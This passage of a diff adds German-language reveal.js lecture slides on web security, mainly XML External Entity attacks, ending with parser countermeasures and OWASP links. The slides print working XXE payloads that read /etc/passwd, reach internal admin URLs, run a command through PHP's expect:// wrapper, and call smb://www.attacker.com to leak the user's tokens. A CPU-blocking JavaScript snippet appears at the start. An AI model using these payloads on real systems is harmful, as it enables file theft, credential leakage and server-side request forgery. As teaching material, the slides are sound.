+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a>(<span class="kw">function</span>(){<span class="kw">var</span> date <span class="op">=</span> <span class="kw">new</span> <span class="bu">Date</span>()<span class="op">;</span> <span class="cf">do</span>{curDate <span class="op">=</span> <span class="kw">new</span> <span class="bu">Date</span>()<span class="op">;</span>}<span class="cf">while</span>(curDate<span class="op">-</span>date<span class="op">&lt;</span><span class="dv">10000</span>)<span class="op">;</span> <span class="cf">return</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">max</span>()<span class="op">;</span>})()</span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a># schöner formattiert</span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a>(<span class="kw">function</span>(){</span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>  <span class="kw">var</span> date <span class="op">=</span> <span class="kw">new</span> <span class="bu">Date</span>()<span class="op">;</span></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">do</span>{ curDate <span class="op">=</span> <span class="kw">new</span> <span class="bu">Date</span>()<span class="op">;</span>}<span class="cf">while</span>(curDate<span class="op">-</span>date<span class="op">&lt;</span><span class="dv">10000</span>)<span class="op">;</span></span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">max</span>()<span class="op">;</span></span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a>})()</span></code></pre></div>
+</section></section>
+<section>
+<section id="xml-external-entities" class="title-slide slide level1">
+<h1>XML External Entities</h1>
+
+</section>
+<section id="grundproblem-1" class="slide level2">
+<h2>Grundproblem</h2>
+<ul>
+<li>XML Dateien müssen serverseitig bearbeitet werden</li>
+<li>XML Parser sind komplex</li>
+<li>Es können Remote Ressourcen eingebunden werden</li>
+</ul>
+</section>
+<section id="beispiel-reading-files" class="slide level2">
+<h2>Beispiel: reading files</h2>
+<div class="sourceCode" id="cb23"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;file:///etc/passwd&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="beispiel-reading-shares" class="slide level2">
+<h2>Beispiel: reading Shares</h2>
+<p>Es werden die Token des aktuellen Benutzers verwendet.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;smb://www.attacker.com&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="beispiel-reading-urls" class="slide level2">
+<h2>Beispiel: reading URLs</h2>
+<div class="sourceCode" id="cb25"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>   <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://www.seite-gegen-das-verbotsgesetz.com/text.txt&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="beispiel-reading-urls-1" class="slide level2">
+<h2>Beispiel: reading URLs</h2>
+<div class="sourceCode" id="cb26"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://192.168.0.1/admin/do-something&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="beispiel-reading-urls-2" class="slide level2">
+<h2>Beispiel: reading URLs</h2>
+<div class="sourceCode" id="cb27"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span>  </span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://localhost:8080/admin/do-something&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xxe;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="if-lucky-php-expect-module" class="slide level2">
+<h2>If lucky: PHP Expect Module</h2>
+<div class="sourceCode" id="cb28"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;ISO-8859-1&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ELEMENT</span> <span class="dt">foo</span> ANY <span class="dt">&gt;</span></span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;expect://id&quot;</span> <span class="dt">&gt;]&gt;</span></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;<span class="dv">&amp;xee;</span>&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+</section>
+<section id="gegenmaßnahmen-1" class="slide level2">
+<h2>Gegenmaßnahmen</h2>
+<ul>
+<li>JSON/CSV sind keine “wirklichen” Alternativen</li>
+<li>Im Parser External Entities <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java">deaktivieren</a></li>
+<li>Wissen, wie der Parser funktioniert..</li>
+</ul>
+</section>
+<section id="million-laughter-attacks" class="slide level2">
+<h2>Million Laughter Attacks</h2>
+<ul>
+<li>DoS-Angriff gegenüber dem Speicher (RAM)</li>
+<li>Meistens über “explodierende” Strukturen</li>
+<li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_Security_Cheat_Sheet.md">XML Security Cheat Sheet</a></li>
+</ul>
+</section></section>
+<section id="fin" class="title-slide slide level1">
+<h1>FIN</h1>
+
+</section>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/reveal.js@^4//dist/reveal.js"></script>
+
+  <!-- reveal.js plugins -->
+  <script src="https://unpkg.com/reveal.js@^4//plugin/notes/notes.js"></script>
+  <script src="https://unpkg.com/reveal.js@^4//plugin/search/search.js"></script>
+  <script src="https://unpkg.com/reveal.js@^4//plugin/zoom/zoom.js"></script>
+
+  <script>
+
+      // Full list of configuration options available at:
+      // https://revealjs.com/config/
+      Reveal.initialize({
+        // Display controls in the bottom right corner
+        controls: true,
+
+        // Help the user learn the controls by providing hints, for example by
+        // bouncing the down arrow when they first encounter a vertical slide
+        controlsTutorial: true,
+
+        // Determines where controls appear, "edges" or "bottom-right"
+        controlsLayout: 'bottom-right',
+
+        // Visibility rule for backwards navigation arrows; "faded", "hidden"
+        // or "visible"
+        controlsBackArrows: 'faded',
+
+        // Display a presentation progress bar
+        progress: true,
+
+        // Display the page number of the current slide
+        slideNumber: false,
+
+        // 'all', 'print', or 'speaker'
+        showSlideNumber: 'all',
+
+        // Add the current slide number to the URL hash so that reloading the
+        // page/copying the URL will return you to the same slide
+        hash: false,
+
+        // Start with 1 for the hash rather than 0
+        hashOneBasedIndex: false,
+
+        // Flags if we should monitor the hash and change slides accordingly
+        respondToHashChanges: true,
+
+        // Push each slide change to the browser history
+        history: false,
+
+        // Enable keyboard shortcuts for navigation
+        keyboard: true,
+
+        // Enable the slide overview mode
+        overview: true,
+
+        // Disables the default reveal.js slide layout (scaling and centering)
+        // so that you can use custom CSS layout
+        disableLayout: false,
+
+        // Vertical centering of slides
+        center: true,
+
+        // Enables touch navigation on devices with touch input
+        touch: true,
+
+        // Loop the presentation
+        loop: false,
+
+        // Change the presentation direction to be RTL
+        rtl: false,
+
+        // see https://revealjs.com/vertical-slides/#navigation-mode
+        navigationMode: 'default',
+
+        // Randomizes the order of slides each time the presentation loads
+        shuffle: false,
+
+        // Turns fragments on and off globally
+        fragments: true,
+
+        // Flags whether to include the current fragment in the URL,
+        // so that reloading brings you to the same fragment position
+        fragmentInURL: true,
+
+        // Flags if the presentation is running in an embedded mode,
+        // i.e. contained within a limited portion of the screen
+        embedded: false,
+
+        // Flags if we should show a help overlay when the questionmark
+        // key is pressed
+        help: true,
+
+        // Flags if it should be possible to pause the presentation (blackout)
+        pause: true,
+
+        // Flags if speaker notes should be visible to all viewers
+        showNotes: false,
+
+        // Global override for autoplaying embedded media (null/true/false)
+        autoPlayMedia: null,
+
+        // Global override for preloading lazy-loaded iframes (null/true/false)
+        preloadIframes: null,
+
+        // Number of milliseconds between automatically proceeding to the
+        // next slide, disabled when set to 0, this value can be overwritten
+        // by using a data-autoslide attribute on your slides
+        autoSlide: 0,
+
+        // Stop auto-sliding after user input
+        autoSlideStoppable: true,
+
+        // Use this method for navigation when auto-sliding
+        autoSlideMethod: null,
+
+        // Specify the average time in seconds that you think you will spend
+        // presenting each slide. This is used to show a pacing timer in the
+        // speaker view
+        defaultTiming: null,
+
+        // Enable slide navigation via mouse wheel
+        mouseWheel: false,
+
+        // The display mode that will be used to show slides
+        display: 'block',
+
+        // Hide cursor if inactive
+        hideInactiveCursor: true,
+
+        // Time before the cursor is hidden (in ms)
+        hideCursorTime: 5000,
+
+        // Opens links in an iframe preview overlay
+        previewLinks: false,
+
+        // Transition style (none/fade/slide/convex/concave/zoom)
+        transition: 'slide',
+
+        // Transition speed (default/fast/slow)
+        transitionSpeed: 'default',
+
+        // Transition style for full page slide backgrounds
+        // (none/fade/slide/convex/concave/zoom)
+        backgroundTransition: 'fade',
+
+        // Number of slides away from the current that are visible
+        viewDistance: 3,
+
+        // Number of slides away from the current that are visible on mobile
+        // devices. It is advisable to set this to a lower number than
+        // viewDistance in order to save resources.
+        mobileViewDistance: 2,
+
+        // reveal.js plugins
+        plugins: [
+          RevealNotes,
+          RevealSearch,
+          RevealZoom
+        ]
+      });
+    </script>
+    </body>
+</html>
